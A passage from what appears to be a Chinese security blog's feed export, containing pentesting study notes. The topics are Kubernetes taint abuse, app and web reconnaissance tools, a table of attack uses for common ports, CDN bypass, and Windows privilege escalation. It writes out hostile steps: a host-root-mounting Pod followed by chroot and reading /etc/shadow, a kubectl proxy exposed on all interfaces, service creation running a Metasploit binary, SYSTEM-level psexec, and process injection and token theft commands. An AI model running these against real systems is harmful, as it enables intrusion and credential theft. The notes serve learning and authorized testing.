命令就可以使 API server 监听在本地的 xxxx 端口上</p><p>环境搭建:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kubectl--insecure-skip-tls-verify proxy-accept-hosts=^.*$ --address=0.0.0.0 --port=8009</span><br><span class="line">//暴露8009端口</span><br></pre></td></tr></table></figure><h2 id="七，K8S-的污点横向移动"><a href="#七，K8S-的污点横向移动" class="headerlink" title="七，K8S 的污点横向移动"></a>七，K8S 的污点横向移动</h2><p>在 K8S 中，利用污点（Taint）进行横向移动渗透是指攻击者通过操纵或绕过集群中的污点和容忍（Toleration）机制，将恶意负载（Pod）调度到原本受保护的节点上，从而突破隔离并进一步渗透集群。污点和容忍是 K8S 的合法功能，设计目的是增强安全性。问题通常源于错误的权限分配（如过宽的 RBAC 策略）或不安全的容忍配置（如 Pod 容忍所有污点）。</p><p>设置污点:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">设置污点：</span><br><span class="line">kubectl taint nodes nodel xtz=valuel:NoSchedule</span><br></pre></td></tr></table></figure><p>通过以下命令查看节点上的污点设置：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kubectl describe node &lt;节点名称&gt;</span><br><span class="line">Taints中 NoSchodule-为没有污点，none也没有污点</span><br></pre></td></tr></table></figure><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/image-11-1024x475.png"><br>查看是否存在污点：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl describe node | grep &#x27;Taints&#x27;</span><br></pre></td></tr></table></figure><p><strong>容忍（Toleration）</strong></p><p>容忍是 Pod 上设置的属性，允许 Pod 被调度到带有特定污点的节点。</p><p>创建带有容忍参数的 Pod (必要时可以修改 Yaml 使 Pod 增加到特定的 Node 上去)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">通过<span class="built_in">cat</span>写入1.yaml配置文件</span></span><br><span class="line">cat &gt; 1.yaml &lt;&lt; EOF</span><br><span class="line">apiVersion: v1</span><br><span class="line">kind: Pod</span><br><span class="line">metadata:</span><br><span class="line">  name: control-master-15</span><br><span class="line">spec:</span><br><span class="line">  tolerations:</span><br><span class="line">    - key: node-role.kubernetes.io/master  //使Pod增加到特定的Node上去</span><br><span class="line">      operator: Exists</span><br><span class="line">      effect: NoSchedule</span><br><span class="line">  containers:</span><br><span class="line">    - name: control-master-15</span><br><span class="line">      image: ubuntu:18.04</span><br><span class="line">      command: [&quot;/bin/sleep&quot;, &quot;3650d&quot;]</span><br><span class="line">      volumeMounts:</span><br><span class="line">      - name: master</span><br><span class="line">        mountPath: /master</span><br><span class="line">  volumes:</span><br><span class="line">  - name: master</span><br><span class="line">    hostPath:</span><br><span class="line">      path: /</span><br><span class="line">      type: Directory</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">创建Pod</span></span><br><span class="line">kubectl create -f control-master.yaml</span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">部署情况</span></span><br><span class="line">kubectl get deploy -o wide</span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Pod详情</span></span><br><span class="line">kubectl get pod -o wide</span><br></pre></td></tr></table></figure><p>获得 Master 控制端</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kubectl exec control-master-15 -it bash</span><br><span class="line">chroot /master bash</span><br><span class="line">ls -al</span><br><span class="line">cat /etc/shadow</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 云安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 云安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息收集-3</title>
      <link href="/2025/06/17/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-3/"/>
      <url>/2025/06/17/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-3/</url>
      
        <content type="html"><![CDATA[<h1 id="信息收集-3"><a href="#信息收集-3" class="headerlink" title="信息收集-3"></a>信息收集-3</h1><p><strong>APP 信息收集</strong></p><p>名称获取 APP 信息（爱企查 &#x2F; 小蓝本 &#x2F; 七麦 &#x2F; 点点）</p><p>1、爱企查知识产权</p><p>2、七麦 &amp; 点点查名称</p><p><a href="https://www.xiaolanben.com/">https://www.xiaolanben.com</a></p><p><a href="https://aiqicha.baidu.com/">https://aiqicha.baidu.com</a></p><p><a href="https://www.qimai.cn/">https://www.qimai.cn</a></p><p><a href="https://app.diandian.com/">https://app.diandian.com</a></p><p>通过获取 App 配置、数据包，去获取 url、api、osskey、js 等敏感信息。</p><p>1、资产信息 - IP 域名 网站 - 转到对应 Web 测试 接口测试 服务测试</p><p>2、泄露信息 - 配置 key 资源文件 – key（osskey 利用，邮件配置等）</p><p>3、代码信息 - java 代码安全问题 - 逆向相关</p><p><strong>APP 中收集资产</strong></p><p>1、抓包 - 动态表现</p><p>2、提取 - 静态表现 &amp; 动态调试</p><p>3、搜索 - 静态表现</p><p>1、抓包抓表现出来的数据</p><p>优点：没有误报</p><p>缺点：无法做到完整</p><p>2、反编译从源码中提取数据</p><p>优点：数据较为完整</p><p>缺点：有很多无用的资产</p><p>3、动态调试从表现中提取数据</p><p>优点：没有误报，解决不能抓包不能代理等情况</p><p>优点；搞逆向的人能看到实时的 app 调用链等</p><p>缺点：无法做到完整</p><p>例子：某 APP 打开无数据包，登录有数据包（反编译后未找到目标资产，抓包抓到了）</p><p>原因：那个登录界面是 APP 打包的资源，并没有对外发送数据</p><p><strong>静态分析：</strong></p><p>AppInfoScanner：</p><p>该产品适用于以 HW 行动 &#x2F; 红队 &#x2F; 渗透测试团队为场景的移动端（Android、iOS、WEB、H5、静态网站）信息收集扫描工具，可以帮助渗透测试工程师、攻击队成员、红队成员快速收集到移动端或者静态 WEB 站点中关键的资产信息并提供基本的信息输出，如：标题、域名、CDN、指纹信息、状态信息等。</p><p><a href="https://github.com/kelvinBen/AppInfoScanner">https://github.com/kelvinBen/AppInfoScanner</a></p><p>Android 相关基本操作：</p><p>对本地 APK 文件进行扫描</p><pre><code>python app.py android -i &lt;Your apk file&gt;  例：python app.py android -i C:\Users\Administrator\Desktop\Demo.apk</code></pre><p>iOS 相关基本操作：<br>对本地 IPA 文件进行扫描<br>    python app.py ios -i <Your ipa file><br>例:<br>    python app.py ios -i “C:\Users\Administrator\Desktop\Demo.ipa” </p><p>Web 相关基本操作：<br>对本地 WEB 站点进行扫描<br>    python app.py web -i <Your web file><br>例:<br>    python app.py web -i “C:\Users\Administrator\Desktop\Demo.html” </p><p><strong>移动安全框架（MobSF）</strong></p><p>移动安全框架（MobSF）是一个自动化、一体化的移动应用程序（Android&#x2F;iOS&#x2F;Windows）渗透测试、恶意软件分析和安全评估框架，能够执行静态和动态分析。MobSF 支持移动应用程序二进制文件（APK、XAPK、IPA 和 APPX）以及压缩的源代码，并提供 REST API，以便与 CI&#x2F;CD 或 DevSecOps 管道无缝集成。动态分析器帮助您执行运行时安全性评估和交互式检测测试。</p><p><a href="https://github.com/MobSF/Mobile-Security-Framework-MobSF">https://github.com/MobSF/Mobile-Security-Framework-MobSF</a></p><p>所需环境：</p><p>本篇以 Windows 为例</p><p>1、安装 Git（示例版本 Git 2.35.1）</p><p>2、安装 Python 3.8-3.9（示例版本 Python 3.8.10）</p><p>3、安装 JDK 8+（示例版本 JDK 1.8.0_172）</p><p>4、安装 Microsoft Visual C++ Build Tools</p><p>5、安装 OpenSSL（non-light）</p><p>6、安装 wkhtmltopdf，并将包含 wkhtmltopdf 的二进制文件路径添加到</p><p>环境变量 PATH 里</p><p>运行： run.bat 127.0.0.1:8000<br><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/image-1-1024x476.png"></p><p><strong>动态抓包：</strong></p><p>使用抓包工具 Burp 等</p><p><strong>动态调试：</strong></p><p>Mobsf 工具中的动态调试 + 模拟器</p>]]></content>
      
      
      <categories>
          
          <category> 基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息收集-2</title>
      <link href="/2025/06/17/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-2/"/>
      <url>/2025/06/17/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-2/</url>
      
        <content type="html"><![CDATA[<h1 id="信息收集-2"><a href="#信息收集-2" class="headerlink" title="信息收集-2"></a>信息收集-2</h1><p>常见端口：</p><table><thead><tr><th>端口</th><th>服务</th><th>渗透用途</th></tr></thead><tbody><tr><td>tcp 20,21</td><td>FTP</td><td>允许匿名的上传下载，爆破，嗅探，win 提权，远程执行 (proftpd1.3.5), 各类后门 (proftpd,vsftp 2.3.4)</td></tr><tr><td>tcp 22</td><td>SSH</td><td>可根据已搜集到的信息尝试爆破，v1 版本可中间人，ssh 隧道及内网代理转发，文件传输等等</td></tr><tr><td>tcp 23</td><td>Telnet</td><td>爆破，嗅探，一般常用于路由，交换登陆，可尝试弱口令</td></tr><tr><td>tcp 25</td><td>SMTP</td><td>邮件伪造，vrfy&#x2F;expn 查询邮件用户信息，可使用 smtp-user enum 工具来自动跑</td></tr><tr><td>tcp&#x2F;udp 53</td><td>DNS</td><td>允许区域传送，dns 劫持，缓存投毒，欺骗以及各种基于 dns 隧道的远控</td></tr><tr><td>tcp&#x2F;udp 69</td><td>TFTP</td><td>尝试下载目标及其的各类重要配置文件</td></tr><tr><td>tcp 80-89,443,8440-8450,8080-8089</td><td>各种常用的 Web 服务端口</td><td>可尝试经典的 topn,vpn,owa,webmail, 目标 oa, 各类 Java 控制台，各类服务器 Web 管理面板，各类 Web 中间件漏洞利用，各类 Web 框架漏洞利用等等……</td></tr><tr><td>tcp 110</td><td>POP3</td><td>可尝试爆破，嗅探</td></tr><tr><td>tcp 111,2049</td><td>NFS</td><td>权限配置不当</td></tr><tr><td>tcp 137,139,445</td><td>Samba</td><td>可尝试爆破以及 smb 自身的各种远程执行类漏洞利用，如，ms08-067,ms17-010, 嗅探等……</td></tr><tr><td>tcp 143</td><td>IMAP</td><td>可尝试爆破</td></tr><tr><td>udp 161</td><td>SNMP</td><td>爆破默认团队字符串，搜集目标内网信息</td></tr><tr><td>tcp 389</td><td>LDAP</td><td>ldap 注入，允许匿名访问，弱口令</td></tr><tr><td>tcp 512,513,514</td><td>Linux rexec</td><td>可爆破，rlogin 登陆</td></tr><tr><td>tcp 873</td><td>Rsync</td><td>匿名访问，文件上传</td></tr><tr><td>tcp 1194</td><td>OpenVPN</td><td>想办法钓 VPN 账号，进内网</td></tr><tr><td>tcp 1352</td><td>Lotus</td><td>弱口令，信息泄漏，爆破</td></tr><tr><td>tcp 1433</td><td>SQL Server</td><td>注入，提权，sa 弱口令，爆破</td></tr><tr><td>tcp 1521</td><td>Oracle</td><td>tns 爆破，注入，弹 shell</td></tr><tr><td>tcp 1500</td><td>ISPmanager</td><td>弱口令</td></tr><tr><td>tcp 1723</td><td>PPTP</td><td>爆破，想办法钓 VPN 账号，进内网</td></tr><tr><td>tcp 2082,2083</td><td>cPanel</td><td>弱口令</td></tr><tr><td>tcp 2181</td><td>ZooKeeper</td><td>未授权访问</td></tr><tr><td>tcp 2601,2604</td><td>Zebra</td><td>默认密码 zerbra</td></tr><tr><td>tcp 3128</td><td>Squid</td><td>弱口令</td></tr><tr><td>tcp 3312,3311</td><td>kangle</td><td>弱口令</td></tr><tr><td>tcp 3306</td><td>MySQL</td><td>注入，提权，爆破</td></tr><tr><td>tcp 3389</td><td>Windows rdp</td><td>shift 后门 [需要 03 以下的系统], 爆破，ms12-020</td></tr><tr><td>tcp 3690</td><td>SVN</td><td>svn 泄露，未授权访问</td></tr><tr><td>tcp 4848</td><td>GlassFish</td><td>弱口令</td></tr><tr><td>tcp 5000</td><td>Sybase&#x2F;DB2</td><td>爆破，注入</td></tr><tr><td>tcp 5432</td><td>PostgreSQL</td><td>爆破，注入，弱口令</td></tr><tr><td>tcp 5900,5901,5</td><td>VNC</td><td>弱口令爆破</td></tr><tr><td>tcp 5984</td><td>CouchDB</td><td>未授权导致的任意指令执行</td></tr><tr><td>tcp 6379</td><td>Redis</td><td>可尝试未授权访问，弱口令爆破</td></tr><tr><td>tcp 7001,7002</td><td>WebLogic</td><td>Java 反序列化，弱口令</td></tr><tr><td>tcp 8000</td><td>Ajenti</td><td>弱口令</td></tr><tr><td>tcp 8009</td><td>tomcat Ajp</td><td>Tomcat-Ajp 协议漏洞</td></tr><tr><td>tcp 8443</td><td>Plesk</td><td>弱口令</td></tr><tr><td>tcp 8069</td><td>Zabbix</td><td>远程执行，SQL 注入</td></tr><tr><td>tcp 8080-8089</td><td>Jenkins,JBoss</td><td>反序列化，控制台弱口令</td></tr><tr><td>tcp 9080-9081,9090</td><td>WebSphere</td><td>Java 反序列化 &#x2F; 弱口令</td></tr><tr><td>tcp 9200,9300</td><td>ElasticSearch</td><td>远程执行</td></tr><tr><td>tcp 11211</td><td>Memcached</td><td>未授权访问</td></tr><tr><td>tcp 27017,27018</td><td>MongoDB</td><td>爆破，未授权访问</td></tr><tr><td>tcp 50070,50030</td><td>Hadoop</td><td>默认端口未授权访问</td></tr></tbody></table><p>端口扫描：Nmap、Masscan、网络空间</p><p><a href="https://github.com/robertdavidgraham/masscan">https://github.com/robertdavidgraham/masscan</a></p><p><strong>waf:</strong></p><p>云 WAF：百度安全宝、阿里云盾、长亭雷池，华为云，亚马逊云等</p><p>硬件 WAF：绿盟、安恒、深信服、知道创宇等公司商业产品</p><p>软件 WAF：宝塔，安全狗、D 盾等</p><p>代码级 WAF：自己写的 waf 规则，防止出现注入等，一般是在代码里面写死的</p><p>遇到云 WAF，硬件 WAF 基本很难绕过，能绕过也没有什么可利用的东西</p><p><strong>蜜罐：</strong></p><p>低交互式蜜罐 ：通常是指与操作系统交互程度较低的蜜罐系统，仅开放一些简单的服务或端口，用来检测扫描和连接，这种容易被识别。</p><p>中交互式蜜罐 ：介于低交互式和高交互式之间，能够模拟操作系统更多的服务，让攻击者看起来更像一个真实的业务，从而对它发动攻击，这样蜜罐就能获取到更多有价值的信息。</p><p>高交互式 ：指的是与操作系统交互很高的蜜罐，它会提供一个更真实的环境，这样更容易吸引入侵者，有利于掌握新的攻击手法和类型，但同样也会存在隐患，会对真实网络造成攻击。</p><p>原理：<br>伪装与仿真：蜜罐模仿真实系统的服务和响应，让攻击者信以为真。</p><p>监控与日志：系统详尽记录所有与蜜罐的交互，包括网络包、系统日志、命令行操作等。</p><p>数据分析：利用自动化工具和人工分析来解析收集的数据，识别攻击模式和趋势。</p><p>1，国外蜜罐产品</p><p>一些常见的蜜罐产品包括：</p><ul><li>Cowrie: Cowrie 是一个基于 Python 的 SSH&#x2F;Telnet 蜜罐，旨在模拟 SSH 和 Telnet 服务，并记录攻击者的行为。</li><li>Honeyd: Honeyd 是一个虚拟蜜罐框架，可以模拟各种网络服务，并产生大量的虚假网络流量，以吸引攻击者。</li><li>Kippo: Kippo 是一个交互式 SSH 蜜罐，可以模拟 SSH 服务，并记录攻击者的输入和行为，以便分析和防御。</li><li>Glastopf: Glastopf 是一个 Web 应用蜜罐，可以模拟各种 Web 服务，并记录攻击者的 Web 请求和攻击行为。</li><li>Thug: Thug 是一个低交互式蜜罐，可以模拟 Web 浏览器，并记录恶意网站的行为和攻击代码。</li><li>DTK (Damn Vulnerable Linux)：一个故意设计漏洞的 Linux 发行版，常用于蜜罐部署和安全教育。</li><li>Conpot：专注于工业控制系统的蜜罐，模拟 SCADA 系统来检测针对工控网络的攻击。</li></ul><p>2，国内蜜罐产品</p><ul><li>知道创宇 - 创宇蜜罐：这是知道创宇公司推出的一款蜜罐产品，专门设计用于模拟真实环境，吸引并监测攻击者的行为，提供攻击预警与行为分析功能。</li><li>长亭科技 - 谛听：长亭科技开发的谛听蜜罐系统，同样着眼于高仿真度和高交互性，能够有效吸引攻击者并收集其攻击手法与意图。</li></ul><p>基本识别方法：</p><p>1.用 Nmap 等 Scan 工具，同一个机器同时开放很多 Port 的。</p><p>2.因为很多蜜罐都设置在相同或临近的网段。所以，同一个网段（e.g. ／24），很多机器都开放相同的 Port，回应相似的 Response。</p><p>3.去 Shodan／Censys 查</p><p><strong>CDN：</strong></p><ol><li><p>传统访问：用户访问域名–&gt; 解析服务器 IP–&gt; 访问目标主机</p></li><li><p>普通 CDN：用户访问域名–&gt;CDN 节点–&gt; 真实服务器 IP–&gt; 访问目标主机</p></li><li><p>带 WAF 的 CDN：用户访问域名–&gt;CDN 节点（WAF）–&gt; 真实服务器 IP–&gt; 访问目标主机</p></li></ol><p>#CDN 配置及绕过：</p><p>配置 1：加速域名 - 需要启用加速的域名</p><p>配置 2：加速区域 - 需要启用加速的地区</p><p>配置 3：加速类型 - 需要启用加速的资源</p><p>#CDN 的判定：</p><p>超级 Ping：<a href="https://17ce.com/">https://17ce.com/</a></p><p>超级 Ping：<a href="https://ping.chinaz.com/">https://ping.chinaz.com/</a></p><p>各地 ping（出现多个 ip 存在 CDN）</p><p>后置：绑定 HOSTS 访问解析</p><p>CDN 绕过：</p><p>1，子域名访问真实 ip（与加速配置有关），国外访问（加速区域没有配置全球访问）</p><p>2，漏洞利用，比如 RCE，SSRF</p><p>3，邮件系统：让它主动给你发送邮件</p><p>部署架构的邮件服务系统主动向用户发送邮件的话，邮件头部的源码会包含邮件服务系统的真实 ip</p><p>对方使用第三方邮件发送就不存在 ip 比如：@126.com，@qq.com 等</p><p>常见的邮箱出发点：</p><p>1，RSS 订阅</p><p>2，邮箱注册，激活处</p><p>3，邮箱找回密码处</p><p>4，产品更新的邮件推送</p><p>5，某业务执行后发送的邮件通知</p><p>6，员工邮箱，邮箱管理系统平台等入口的忘记密码</p><p>你给未知的邮箱发送：（需要自己的邮箱服务器不能第三方）</p><p>网站查询：</p><p><a href="https://get-site-ip.com/(%E5%8F%82%E8%80%83)">https://get-site-ip.com/(参考)</a></p>]]></content>
      
      
      <categories>
          
          <category> 基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息收集-1</title>
      <link href="/2025/06/17/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-1/"/>
      <url>/2025/06/17/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-1/</url>
      
        <content type="html"><![CDATA[<h1 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集-1"></a>信息收集-1</h1><h2 id="CMS-指纹识别"><a href="#CMS-指纹识别" class="headerlink" title="CMS 指纹识别"></a>CMS 指纹识别</h2><p>在线 cms 指纹识别：<a href="http://whatweb.bugscaner.com/look/">http://whatweb.bugscaner.com/look/</a></p><p>Wappalyzer：<a href="https://github.com/AliasIO/wappalyzer">https://github.com/AliasIO/wappalyzer</a></p><p>TideFinger 潮汐：<a href="http://finger.tidesec.net/">http://finger.tidesec.net/</a></p><p>云悉指纹：<a href="https://www.yunsee.cn/">https://www.yunsee.cn/</a></p><p>WhatWeb：GitHub – urbanadventurer&#x2F;WhatWeb: Next generation web scanner</p><p>数字观星 Finger-P：<a href="https://fp.shuziguanxing.com/#/">https://fp.shuziguanxing.com/#/</a></p><h2 id="后端-闭源-配置不当-源码泄漏"><a href="#后端-闭源-配置不当-源码泄漏" class="headerlink" title="后端 - 闭源 - 配置不当 - 源码泄漏"></a>后端 - 闭源 - 配置不当 - 源码泄漏</h2><p>参考：<a href="https://www.secpulse.com/archives/124398.html">https://www.secpulse.com/archives/124398.html</a></p><p>备份：敏感目录文件扫描</p><p>CVS：<a href="https://github.com/kost/dvcs-ripper">https://github.com/kost/dvcs-ripper</a></p><p>GIT：<a href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a></p><p>SVN：<a href="https://github.com/callmefeifei/SvnHack">https://github.com/callmefeifei/SvnHack</a></p><p>DS_Store：<a href="https://github.com/lijiejie/ds_store_exp">https://github.com/lijiejie/ds_store_exp</a></p><p>composer.json：php 中，composer.json, 它描述了组件的信息: 名称 , 描述 , 关键词 , 作者 , GitHub 仓库地址…</p><p>git 源码泄露，svn 源码泄露，hg 源码泄漏，网站备份压缩文件，WEB-INF&#x2F;web.xml 泄露，DS_Store 文件泄露，SWP 文件泄露，CVS 泄露，Bzr 泄露，GitHub 源码泄漏</p><p>有些小公司，或者黑色产业，会使用网上的源码进行搭建自己的 app 等，对网上的源码进行比对</p><p><a href="https://tool.chinaz.com/Default.aspx/">站长服务中心 — 网络维护服务市场，身边的技术服务顾问 – 互站网</a></p><h2 id="什么是-JS-渗透测试？"><a href="#什么是-JS-渗透测试？" class="headerlink" title="什么是 JS 渗透测试？"></a>什么是 JS 渗透测试？</h2><p>在 Javascript 中也存在变量和函数，当存在可控变量及函数调用即可参数漏洞</p><p>JS 开发的 WEB 应用和 PHP，JAVA,NET 等区别在于即没有源代码，也可以通过浏览器的</p><p>查看源代码获取真实的点。获取 URL，获取 JS 敏感信息，获取代码传参等，所以相当于</p><p>JS 开发的 WEB 应用属于白盒测试（默认有源码参考），一般会在 JS 中寻找更多的 URL</p><p>地址，在 JS 代码逻辑（加密算法，APIkey 配置，验证逻辑等）进行后期安全测试。</p><h2 id="JS-安全问题"><a href="#JS-安全问题" class="headerlink" title="JS 安全问题"></a>JS 安全问题</h2><p><strong>源码泄漏</strong></p><p>未授权访问 &#x3D; JS 里面分析更多的 URL 访问确定接口路径</p><p>敏感 key 泄漏 &#x3D; JS 文件中可能配置了接口信息（云应用，短信，邮件，数据库等）</p><p>API 接口安全 &#x3D;（代码中加密提交参数传递，更多的 URL 路径）</p><p><strong>手工分析模式：</strong><br>1，先用 network 2，用 wappalyzer 查看框架 3，只看 js（vue.js) 4,看 admin&#x2F;login 等这种 5,ctrl + shift +f 搜索获取价值信息。</p><p><strong>快速获取价值信息</strong><br>src&#x3D;</p><p>path&#x3D;</p><p>method&#x3D;”get”、method&#x3D;”post”</p><p>http.get(“、http.post(“</p><p>$.ajax</p><p><a href="http://service.httpget/">http://service.httpget</a></p><p><a href="http://service.httppost/">http://service.httppost</a></p><p><strong>JS 前端架构 — 半自动 Burp</strong><br>官方插件：JS Link Finder &amp; JS Miner</p><p>第三方插件：HaE &amp; Unexpected_information</p><p>Unexpected_information：<a href="https://github.com/ScriptKid-Beta/Unexpected_information">https://github.com/ScriptKid-Beta/Unexpected_information</a></p><p>用来标记请求包中的一些敏感信息、JS 接口和一些特殊字段，<br>防止我们疏忽了一些数据包，使用它可能会有意外的收获信息。</p><p>HaE：<a href="https://github.com/gh0stkey/HaE">https://github.com/gh0stkey/HaE</a></p><p>基于 BurpSuite 插件 JavaAPI 开发的请求高亮标记与信息提取的辅助型插件。该插件可以通过自定义正则的方式匹配响应报文或请求报文，可以自行决定符合该自定义正则匹配的相应请求是否需要高亮标记、信息提取。</p><p>JS 网络扫描工具：JSFinder，URLFinder，ffuf-FUZZ，Packer-Fuzzer，Findsomething</p><p>1，JSFinder: 一款用作快速在网站的 js 文件中提取 URL，子域名的工具。</p><p><a href="https://github.com/Threezh1/JSFinder">https://github.com/Threezh1/JSFinder</a></p><p>2，URLFinder: 更专注于提取页面中的 JS 与 URL 链接，提取的数据更完善且可查看状态码、内容大小、标题等</p><p><a href="https://github.com/pingc0y/URLFinder">https://github.com/pingc0y/URLFinder</a></p><pre><code>URLFinder.exe -u http://www.baidu.com -s all -m 2</code></pre><p>3，ffuf-FUZZ：爆破找到更多的 js 文件分析更多的信息<br><a href="https://github.com/ffuf/ffuf">https://github.com/ffuf/ffuf</a></p><p><a href="https://wordlists.assetnote.io/">https://wordlists.assetnote.io</a> （下载字典网址）<br>功能强大的模糊化工具，用它来 FUZZ 模糊化 js 文件。</p><pre><code>ffuf.exe -w 字典.txt -u &lt;域名&gt;/FUZZ -t 200 -of csv -o 2.csv</code></pre><p>4，Packer-Fuzzer：一款针对 Webpack 等前端打包工具所构造的网站进行快速、高效安全检测的扫描工具。</p><p><a href="https://github.com/rtcatc/Packer-Fuzzer">https://github.com/rtcatc/Packer-Fuzzer</a></p><p>5，Findsomething：从表现中 JS 中提取 URL 或者敏感数据（包括请求的资源、接口的 url，请求的 ip 和域名，泄漏的证件号、手机号、邮箱等信息。）</p><p><a href="https://github.com/momosecurity/FindSomething">https://github.com/momosecurity/FindSomething</a></p><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/%E5%9B%BE%E7%89%87-18-1.png" alt="RUNOOB 属性文本"></p>]]></content>
      
      
      <categories>
          
          <category> 基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>权限提升-3-Win提权</title>
      <link href="/2025/06/17/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-3/"/>
      <url>/2025/06/17/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-3/</url>
      
        <content type="html"><![CDATA[<h1 id="权限提升-3"><a href="#权限提升-3" class="headerlink" title="权限提升-3"></a>权限提升-3</h1><h2 id="Win提权"><a href="#Win提权" class="headerlink" title="Win提权"></a>Win提权</h2><h3 id="服务启动"><a href="#服务启动" class="headerlink" title="服务启动"></a>服务启动</h3><p>sc是用于与服务控制管理器和服务进行通讯的命令行程序。<br>使用版本:windows 7,10,08,12,16,19,22,早期用at命令<br>1，创建一个名叫syscmd的执行文件</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc Create syscmd binPath<span class="operator">=</span><span class="string">&quot;C:\msf.exe&quot;</span></span><br></pre></td></tr></table></figure><p>2,运行服务</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sc</span> <span class="built_in">start</span> syscmd</span><br></pre></td></tr></table></figure><h3 id="Psexec提权"><a href="#Psexec提权" class="headerlink" title="Psexec提权"></a>Psexec提权</h3><p>（适用于 Win2003 &amp; Win2008）<br>Psexec是Systinternals出品的强大工具，可以让你在远程系统上执行命令<br>下载地址：<br><a href="https://download.sysinternals.com/files/PSTools.zip">https://download.sysinternals.com/files/PSTools.zip</a></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">psexec -<span class="selector-tag">i</span> -s -d cmd #以system权限运行cmd</span><br><span class="line">psexec<span class="selector-class">.exe</span> -accepteula -<span class="selector-tag">i</span> -s -d cmd<span class="selector-class">.exe</span> #加上-accepteula参数，避免弹出许可协议</span><br></pre></td></tr></table></figure><h3 id="进程注入"><a href="#进程注入" class="headerlink" title="进程注入"></a>进程注入</h3><p>MSF：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ps <span class="comment">//查看进程</span></span><br><span class="line">migrate PID <span class="comment">//迁移对应PID</span></span><br></pre></td></tr></table></figure><p>CS:</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ps <span class="comment">//查看进程</span></span><br><span class="line"><span class="keyword">inject</span> PID <span class="comment">//注入对应PID</span></span><br></pre></td></tr></table></figure><h3 id="令牌窃取"><a href="#令牌窃取" class="headerlink" title="令牌窃取"></a>令牌窃取</h3><p>MSF：</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> incognito</span><br><span class="line">list_tokens -u</span><br><span class="line">impersonate_token <span class="string">&quot;NT AUTHORITY\SYSTEM&quot;</span></span><br></pre></td></tr></table></figure><p>CS:</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ps <span class="comment">//查看进程</span></span><br><span class="line">steal_token PID <span class="comment">//窃取进程令牌</span></span><br><span class="line">spawnu PID <span class="comment">//窃取进程令牌上线</span></span><br></pre></td></tr></table></figure><h3 id="UAC绕过"><a href="#UAC绕过" class="headerlink" 